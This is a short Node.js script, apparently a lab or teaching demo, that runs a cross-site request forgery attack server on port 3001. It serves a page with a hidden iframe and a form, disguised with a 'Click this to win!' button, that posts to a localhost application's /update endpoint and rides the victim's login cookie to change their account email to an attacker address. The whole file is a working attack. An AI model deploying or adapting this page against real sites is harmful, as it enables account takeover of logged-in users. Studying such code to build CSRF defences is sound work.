const http = require('http');

const attackerEmail = 'attacker@example.com';

// this will send post request to victim server to change email,
// by leveraging the cookie (the fact that the user is already logged in)
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(`
    <iframe name=hide style="position: absolute; left: -1000px"></iframe>
    <form method="POST" action="http://localhost:3000/update" target="hide">
      <input type="hidden" name="email" value="${attackerEmail}" />
      <input type="submit" value="Click this to win!" />
    </form>
  `);
});

server.listen(3001, () => {
  console.log('CSRF attack server running on http://localhost:3001');
});
